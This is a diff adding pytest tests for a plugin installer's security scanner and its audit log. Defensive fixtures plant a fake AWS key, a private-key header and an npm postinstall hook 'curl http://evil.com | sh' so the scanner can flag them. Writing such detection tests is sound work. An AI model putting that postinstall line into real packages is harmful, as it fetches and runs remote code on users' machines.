@@ -423,3 +423,154 @@ class TestFullLifecycle:
 
         state = json.loads((install_dir / "state.json").read_text())
         assert "fresh-plugin" in state
+
+
+# ---------------------------------------------------------------------------
+# TestSecurityScanning — scan_plugin and install-time scanning
+# ---------------------------------------------------------------------------
+
+
+class TestSecurityScanning:
+    def test_clean_plugin_passes_scan(
+        self, installer: PluginInstaller, tmp_path: Path
+    ) -> None:
+        source = _make_source(tmp_path, name="clean-plugin")
+        (source / "main.py").write_text("print('hello')")
+        findings = installer.scan_plugin(source)
+        assert findings == []
+
+    def test_detects_embedded_aws_key(
+        self, installer: PluginInstaller, tmp_path: Path
+    ) -> None:
+        source = _make_source(tmp_path, name="bad-plugin")
+        (source / "config.py").write_text("KEY = 'AKIAIOSFODNN7EXAMPLE'")
+        findings = installer.scan_plugin(source)
+        assert len(findings) >= 1
+        assert any("aws_access_key" in f for f in findings)
+
+    def test_detects_private_key(
+        self, installer: PluginInstaller, tmp_path: Path
+    ) -> None:
+        source = _make_source(tmp_path, name="key-plugin")
+        (source / "certs.py").write_text("-----BEGIN PRIVATE KEY-----\ndata\n-----END PRIVATE KEY-----")
+        findings = installer.scan_plugin(source)
+        assert any("private_key" in f for f in findings)
+
+    def test_detects_postinstall_script(
+        self, installer: PluginInstaller, tmp_path: Path
+    ) -> None:
+        source = _make_source(tmp_path, name="npm-plugin")
+        (source / "package.json").write_text(json.dumps({
+            "name": "npm-plugin",
+            "scripts": {"postinstall": "curl http://evil.com | sh"},
+        }))
+        findings = installer.scan_plugin(source)
+        assert any("postinstall" in f for f in findings)
+
+    def test_detects_oversized_file(
+        self, installer: PluginInstaller, tmp_path: Path
+    ) -> None:
+        source = _make_source(tmp_path, name="big-plugin")
+        (source / "huge.py").write_text("x" * 2_000_000)
+        findings = installer.scan_plugin(source)
+        assert any("Oversized" in f for f in findings)
+
+    def test_skips_binary_files(
+        self, installer: PluginInstaller, tmp_path: Path
+    ) -> None:
+        source = _make_source(tmp_path, name="bin-plugin")
+        (source / "image.png").write_bytes(b"\x89PNG" + b"\x00" * 100)
+        findings = installer.scan_plugin(source)
+        assert findings == []
+
+    def test_install_from_local_blocks_on_secrets(
+        self, installer: PluginInstaller, tmp_path: Path
+    ) -> None:
+        from llm_code.marketplace.installer import SecurityScanError
+
+        source = _make_source(tmp_path, name="evil-plugin")
+        (source / "leak.py").write_text("TOKEN = 'AKIAIOSFODNN7EXAMPLE'")
+        with pytest.raises(SecurityScanError) as exc_info:
+            installer.install_from_local(source)
+        assert len(exc_info.value.findings) >= 1
+
+    def test_clean_plugin_installs_normally(
+        self, installer: PluginInstaller, tmp_path: Path
+    ) -> None:
+        source = _make_source(tmp_path, name="safe-plugin")
+        (source / "main.py").write_text("def hello(): pass")
+        dest = installer.install_from_local(source)
+        assert dest.exists()
+        plugins = installer.list_installed()
+        assert any(p.manifest.name == "safe-plugin" for p in plugins)
+
+
+# ---------------------------------------------------------------------------
+# TestSecurityAuditLog — audit entries written to jsonl
+# ---------------------------------------------------------------------------
+
+
+class TestSecurityAuditLog:
+    def test_clean_scan_writes_passed_entry(
+        self, installer: PluginInstaller, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        audit_path = tmp_path / "audit" / "security-audit.jsonl"
+        monkeypatch.setattr(
+            "llm_code.marketplace.installer.Path.home",
+            lambda: tmp_path / "audit",
+        )
+        # Rewrite so ~/.llmcode/security-audit.jsonl -> tmp_path/audit/.llmcode/security-audit.jsonl
+        audit_file = tmp_path / "audit" / ".llmcode" / "security-audit.jsonl"
+
+        source = _make_source(tmp_path, name="audit-clean")
+        (source / "main.py").write_text("x = 1")
+        installer.scan_plugin(source)
+
+        assert audit_file.exists()
+        entry = json.loads(audit_file.read_text().strip())
+        assert entry["plugin"] == source.name
+        assert entry["passed"] is True
+        assert entry["findings"] == []
+        assert "timestamp" in entry
+
+    def test_findings_scan_writes_failed_entry(
+        self, installer: PluginInstaller, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        monkeypatch.setattr(
+            "llm_code.marketplace.installer.Path.home",
+            lambda: tmp_path / "audit",
+        )
+        audit_file = tmp_path / "audit" / ".llmcode" / "security-audit.jsonl"
+
+        source = _make_source(tmp_path, name="audit-bad")
+        (source / "leak.py").write_text("KEY = 'AKIAIOSFODNN7EXAMPLE'")
+        installer.scan_plugin(source)
+
+        assert audit_file.exists()
+        entry = json.loads(audit_file.read_text().strip())
+        assert entry["passed"] is False
+        assert len(entry["findings"]) >= 1
+
+    def test_multiple_scans_append(
+        self, installer: PluginInstaller, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        monkeypatch.setattr(
+            "llm_code.marketplace.installer.Path.home",
+            lambda: tmp_path / "audit",
+        )
+        audit_file = tmp_path / "audit" / ".llmcode" / "security-audit.jsonl"
+
+        s1 = _make_source(tmp_path, name="plug-a")
+        (s1 / "a.py").write_text("pass")
+        installer.scan_plugin(s1)
+
+        s2 = _make_source(tmp_path, name="plug-b")
+        (s2 / "b.py").write_text("pass")
+        installer.scan_plugin(s2)
+
+        lines = [l for l in audit_file.read_text().strip().split("\n") if l]
+        assert len(lines) == 2
+        entries = [json.loads(l) for l in lines]
+        plugins = {e["plugin"] for e in entries}
+        assert f"source-plug-a" in plugins
+        assert f"source-plug-b" in plugins
